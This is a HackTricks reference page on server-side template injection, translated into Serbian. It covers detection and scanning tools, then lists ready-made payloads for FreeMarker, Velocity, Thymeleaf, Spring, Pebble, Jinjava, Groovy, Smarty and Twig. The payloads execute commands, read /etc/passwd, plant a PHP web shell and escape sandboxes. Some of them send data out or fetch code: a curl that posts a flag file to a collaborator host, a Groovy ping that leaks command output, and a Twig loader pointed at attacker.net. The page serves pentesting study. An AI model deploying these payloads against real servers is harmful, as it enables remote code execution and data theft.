# SSTI (Server Side Template Injection)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com) je najrelevantniji kiberneti캜ki doga캠aj u **맗aniji** i jedan od najva쬹ijih u **Evropi**. Sa **misijom promovisanja tehni캜kog znanja**, ovaj kongres je klju캜no mesto susreta tehnolo코kih i kiberneti캜kih profesionalaca u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## 맚a je SSTI (Server-Side Template Injection)

Server-side template injection je ranjivost koja se javlja kada napada캜 mo쬰 da ubaci zlonamerni kod u 코ablon koji se izvr코ava na serveru. Ova ranjivost mo쬰 se na캖i u raznim tehnologijama, uklju캜uju캖i Jinja.

Jinja je popularni 코ablonski engine koji se koristi u veb aplikacijama. Razmotrimo primer koji demonstrira ranjivu deonicu koda koriste캖i Jinju:
```python
output = template.render(name=request.args.get('name'))
```
U ovom ranjivom kodu, parametar `name` iz zahteva korisnika direktno se prosle캠uje u 코ablonu koriste캖i funkciju `render`. Ovo potencijalno omogu캖ava napada캜u da ubaci zlonamerni kod u parametar `name`, 코to dovodi do ubrizgavanja 코ablona na serverskoj strani.

Na primer, napada캜 mo쬰 da kreira zahtev sa payload-om kao 코to je:
```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Payload `{{lo코e-stvari-ovde}}` je uba캜en u parametar `name`. Ovaj payload mo쬰 sadr쬬ti Jinja direktive za 코ablone koje omogu캖avaju napada캜u da izvr코i neovla코캖eni kod ili manipuli코e ma코inom za 코ablone, potencijalno preuzimaju캖i kontrolu nad serverom.

Da bi se spre캜ile ranjivosti servera zbog ubrizgavanja 코ablona na serverskoj strani, programeri trebaju osigurati da korisni캜ki unos bude pravilno dezinfikovan i validiran pre nego 코to se ubaci u 코ablone. Implementacija validacije unosa i kori코캖enje tehnika za izbegavanje konteksta mogu pomo캖i u smanjenju rizika od ove ranjivosti.

### Detekcija
Da bi se otkrilo ubrizgavanje 코ablona na serverskoj strani (SSTI), na po캜etku je jednostavan pristup **testiranje 코ablona**. To podrazumeva ubrizgavanje sekvence posebnih karaktera (**`${{<%[%'"}}%\`**) u 코ablon i analiziranje razlika u odgovoru servera na regularne podatke u odnosu na ovaj posebni payload. Indikatori ranjivosti uklju캜uju:
- Izba캜ene gre코ke koje otkrivaju ranjivost i potencijalno ma코inu za 코ablone.
- Odsustvo payloada u refleksiji ili delovi koji nedostaju, 코to implicira da server obra캠uje podatke druga캜ije od regularnih podataka.

- **Tekstualni kontekst**: Razlikovanje od XSS-a proverom da li server evaluira izraze 코ablona (npr. `{{7*7}}`, `${7*7}`).

- **Kontekst koda**: Potvrda ranjivosti izmenom ulaznih parametara. Na primer, promena `greeting` u `http://vulnerable-website.com/?greeting=data.username` da biste videli da li je izlaz servera dinami캜an ili fiksan, kao 코to je u `greeting=data.username}}hello` koji vra캖a korisni캜ko ime.

#### Faza identifikacije
Identifikacija ma코ine za 코ablone podrazumeva analizu poruka o gre코kama ili ru캜no testiranje razli캜itih jezi캜ki specifi캜nih payloada. Uobi캜ajeni payloadi koji izazivaju gre코ke uklju캜uju `${7/0}`, `{{7/0}}` i `<%= 7/0 %>`. Posmatranje odgovora servera na matemati캜ke operacije poma쬰 u preciziranju odre캠ene ma코ine za 코ablone.

## Alati

### [TInjA](https://github.com/Hackmanit/TInjA)

efikasan skener za SSTI + CSTI koji koristi nove poliglote
```bash
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
### [SSTImap](https://github.com/vladko312/sstimap)

SSTImap je alat koji se koristi za otkrivanje i iskori코캖avanje ranjivosti server-side template injection (SSTI) u aplikacijama. Ovaj alat je napisan u Pythonu i omogu캖ava pentesterima da automatski pronalaze i eksploati코u SSTI ranjivosti.

#### Instalacija

Da biste instalirali SSTImap, pratite slede캖e korake:

1. Klonirajte repozitorijum sa GitHub-a:

   ```
   git clone https://github.com/vladko312/sstimap.git
   ```

2. Instalirajte zavisnosti pomo캖u pip-a:

   ```
   pip install -r requirements.txt
   ```

#### Upotreba

SSTImap se mo쬰 koristiti na slede캖i na캜in:

```
python sstimap.py -u <URL> -p <PAYLOAD> -c <COOKIE>
```

Gde su:

- `<URL>`: URL ciljane aplikacije
- `<PAYLOAD>`: SSTI payload koji se koristi za eksploataciju ranjivosti
- `<COOKIE>` (opciono): Cookie vrednost za autentifikaciju

#### Primer

Evo primera kako se koristi SSTImap:

```
python sstimap.py -u https://example.com -p "{{7*7}}" -c "session=123456789"
```

Ovaj primer 캖e poslati SSTI payload `{{7*7}}` na URL `https://example.com` sa cookie vredno코캖u `session=123456789`. SSTImap 캖e zatim analizirati odgovor i prikazati rezultate.

#### Napomena

SSTImap je mo캖an alat koji mo쬰 otkriti i iskoristiti SSTI ranjivosti. Me캠utim, pre upotrebe ovog alata, uvek se uverite da imate dozvolu za testiranje ranjivosti i da radite na legalan na캜in.
```bash
python3 sstimap.py -i -l 5
python3 sstimap.py -u "http://example.com/ --crawl 5 --forms
python3 sstimap.py -u 'https://example.com/page?name=John' -s
```
### [Tplmap](https://github.com/epinna/tplmap)

Tplmap je alat za automatsko otkrivanje i iskori코캖avanje ranjivosti server-side template injection (SSTI). Ovaj alat je posebno koristan tokom testiranja penetracije web aplikacija koje koriste server-side template engine za generisanje dinami캜kog sadr쬬ja.

#### Instalacija

Da biste instalirali Tplmap, mo쬰te ga preuzeti sa [ovog linka](https://github.com/epinna/tplmap) i pratiti uputstva za instalaciju.

#### Kori코캖enje

Tplmap se koristi tako 코to se navede ciljna URL adresa i odgovaraju캖i parametar koji je podlo쬬n SSTI ranjivosti. Alat 캖e automatski poku코ati da otkrije i iskoristi ranjivost, pru쬬ju캖i informacije o mogu캖im eksploatacijama.

```bash
tplmap -u <URL> -d <PARAMETAR>
```

#### Napomena

Kao i kod svih alata za testiranje penetracije, va쬹o je da koristite Tplmap samo u okviru zakonitih aktivnosti i sa dozvolom vlasnika sistema koji testirate. Nepravilna upotreba ovog alata mo쬰 biti protivzakonita i podle쬰 pravnim sankcijama.
```python
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
### [Tabela za ubacivanje 코ablona](https://github.com/Hackmanit/template-injection-table)

interaktivna tabela koja sadr쬴 najefikasnije poliglote za ubacivanje 코ablona zajedno sa o캜ekivanim odgovorima 44 najva쬹ija 코ablonska motora.

## Eksploatacije

### Op코te

U ovoj **listi re캜i** mo쬰te prona캖i **definisane promenljive** u okru쬰njima nekih od navedenih motora:

* [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-special-vars.txt)
* [https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt)

### Java

**Java - Osnovno ubacivanje**
```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.
```
**Java - Prikupljanje sistemskih varijabli okru쬰nja**

U Java programskom jeziku mo쬰te dobiti pristup sistemskim varijablama okru쬰nja pomo캖u klase `System`. Ova klasa pru쬬 metodu `getenv()` koja vra캖a mapu svih trenutnih sistemskih varijabli okru쬰nja.

```java
import java.util.Map;

public class EnvironmentVariables {
    public static void main(String[] args) {
        Map<String, String> env = System.getenv();
        for (String key : env.keySet()) {
            String value = env.get(key);
            System.out.println(key + " = " + value);
        }
    }
}
```

Ovaj program 캖e prikazati sve sistemsko varijable okru쬰nja i njihove vrednosti.
```java
${T(java.lang.System).getenv()}
```
**Java - Pribavljanje /etc/passwd fajla**

U nekim situacijama, kada je server podlo쬬n Server-Side Template Injection (SSTI) ranjivosti, mogu캖e je iskoristiti ovu ranjivost kako bi se dobio pristup fajlovima na serveru. Jedan od takvih fajlova je `/etc/passwd`, koji sadr쬴 informacije o korisnicima na Unix/Linux sistemima.

Da biste dobili pristup `/etc/passwd` fajlu putem SSTI ranjivosti u Javi, mo쬰te koristiti slede캖i kod:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class SSTIExploit {
    public static void main(String[] args) {
        try {
            String command = "cat /etc/passwd";
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            reader.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Ovaj kod koristi `Runtime.getRuntime().exec()` metodu da izvr코i komandu `cat /etc/passwd` na serveru. Rezultat se 캜ita liniju po liniju i ispisuje na standardni izlaz.

Va쬹o je napomenuti da je ovo samo jedan primer kako se mo쬰 iskoristiti SSTI ranjivost da bi se dobio pristup `/etc/passwd` fajlu. U praksi, ova ranjivost mo쬰 biti iskori코캖ena za izvr코avanje razli캜itih komandi i pristup drugim osetljivim fajlovima na serveru.
```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
### FreeMarker (Java)

Mo쬰te isprobati svoje payload-e na [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Ni코ta`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Bypass bezbednosnog peska**

丘멆잺 radi samo na verzijama Freemarker-a ispod 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Vi코e informacija**

* U odeljku o FreeMarkeru na [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```
**Vi코e informacija**

* U odeljku Velocity na [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf

U Thymeleaf-u, uobi캜ajeni test za SSTI ranjivosti je izraz `${7*7}`, koji tako캠e va쬴 i za ovaj template engine. Za potencijalno izvr코avanje udaljenog koda, mogu se koristiti izrazi poput slede캖ih:

- SpringEL:
```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
- OGNL:
```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Thymeleaf zahteva da se ovi izrazi postave unutar odre캠enih atributa. Me캠utim, _inline izrazi_ se podr쬬vaju za druge lokacije template-a, koriste캖i sintaksu poput `[[...]]` ili `[(...)]`. Dakle, jednostavan SSTI test payload bi mogao izgledati kao `[[${7*7}]]`.

Me캠utim, verovatno캖a da ovaj payload funkcioni코e je generalno niska. Podrazumevana konfiguracija Thymeleaf-a ne podr쬬va dinami캜ko generisanje template-a; template-i moraju biti unapred definisani. Razvojni programeri bi morali da implementiraju sopstveni `TemplateResolver` kako bi kreirali template-e iz stringova u hodu, 코to je neobi캜no.

Thymeleaf tako캠e nudi _preprocesiranje izraza_, gde se izrazi unutar duplih donjih crta (`__...__`) preprocesiraju. Ova funkcionalnost se mo쬰 koristiti pri konstrukciji izraza, kao 코to je prikazano u dokumentaciji Thymeleaf-a:
```java
#{selection.__${sel.code}__}
```
**Primer ranjivosti u Thymeleaf-u**

Razmotrite slede캖i odlomak koda, koji mo쬰 biti podlo쬬n zloupotrebi:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
Ovo ukazuje da ukoliko ma코ina za 코ablon obradi ove ulaze nepravilno, to mo쬰 dovesti do izvr코avanja udaljenog koda pristupaju캖i URL-ovima kao 코to su:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Vi코e informacija**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Bypassiranje filtera**

Mogu se koristiti vi코estruki izrazi promenljivih, ako `${...}` ne funkcioni코e, poku코ajte sa `#{...}`, `*{...}`, `@{...}` ili `~{...}`.

* 캛itanje `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Prilago캠eni skript za generisanje payload-a
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Vi코e informacija**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Manipulacija Spring View-a (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Stara verzija Pebble-a ( < verzija 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Nova verzija Pebble-a:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

Jinjava je biblioteka za obradu 코ablona na serverskoj strani koja se koristi u Java aplikacijama. Ona omogu캖ava programerima da koriste 코ablone za generisanje dinami캜kog sadr쬬ja na serverskoj strani. Jinjava podr쬬va Server-Side Template Injection (SSTI) napade kada se nevalidni ili zlonamerni ulazni podaci ubace u 코ablon i izvr코e se na serverskoj strani.

Da biste izvr코ili SSTI napad na Jinjava, trebate prona캖i mesto gde se korisni캜ki unos ubacuje u 코ablon i manipulisati unosom kako biste izvr코ili zlonamerne operacije. Ovo mo쬰 uklju캜ivati ubacivanje koda, izvr코avanje sistemskih komandi ili 캜itanje osetljivih podataka sa serverskog sistema.

Da biste se za코titili od SSTI napada u Jinjava, trebali biste sanitizovati korisni캜ki unos i ograni캜iti privilegije 코ablona. Tako캠e je va쬹o a쬿rirati Jinjava biblioteku na najnoviju verziju kako biste iskoristili sigurnosne ispravke.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjava je open source projekat koji je razvijen od strane Hubspot-a, dostupan na [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

**Jinjava - Izvr코avanje komandi**

Popravljeno od strane [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Vi코e informacija**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` delimitatori za izjave
* `{{ }}` delimitatori za izraze
* `{# #}` delimitatori za komentare
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Pretra쬴te "com.hubspot.content.hubl.context.TemplateContextRequest" i otkrijte [Jinjava projekat na Github-u](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Vi코e informacija**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Expression Language - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

Expression Language (EL) je osnovna funkcionalnost koja olak코ava interakciju izme캠u sloja prezentacije (kao 코to su web stranice) i aplikacijske logike (kao 코to su upravljani objekti) u JavaEE. Ona se 코iroko koristi u vi코e JavaEE tehnologija kako bi se olak코ala ova komunikacija. Klju캜ne JavaEE tehnologije koje koriste EL uklju캜uju:

- **JavaServer Faces (JSF)**: Koristi EL za povezivanje komponenti na JSF stranicama sa odgovaraju캖im podacima i akcijama na backend-u.
- **JavaServer Pages (JSP)**: EL se koristi u JSP-u za pristupanje i manipulaciju podacima unutar JSP stranica, 캜ime se olak코ava povezivanje elemenata stranice sa podacima aplikacije.
- **Contexts and Dependency Injection for Java EE (CDI)**: EL se integri코e sa CDI-om kako bi omogu캖io besprekornu interakciju izme캠u web sloja i upravljanih objekata, obezbe캠uju캖i koherentniju strukturu aplikacije.

Proverite slede캖u stranicu da biste saznali vi코e o **eksploataciji EL interpretera**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

Slede캖i zaobilazi캜i bezbednosnog menad쬰ra preuzeti su sa ovog [**izve코taja**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/).
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji doga캠aj u oblasti kiberneti캜ke bezbednosti u **맗aniji** i jedan od najva쬹ijih u **Evropi**. Sa **misijom promovisanja tehni캜kog znanja**, ovaj kongres je vrelo mesto susreta tehnolo코kih i kiberneti캜kih stru캜njaka u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**Vi코e informacija**

* U Smarty sekciji na [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - Format 코ablona**

Twig je popularan format 코ablona koji se koristi u mnogim web aplikacijama napisanim u PHP-u. Twig pru쬬 mo캖ne funkcionalnosti za generisanje HTML-a i drugih vrsta izlaza. Twig koristi sintaksu sli캜nu Pythonu i omogu캖ava programerima da koriste promenljive, petlje, uslove i druge konstrukcije jezika kako bi dinami캜ki generisali sadr쬬j.

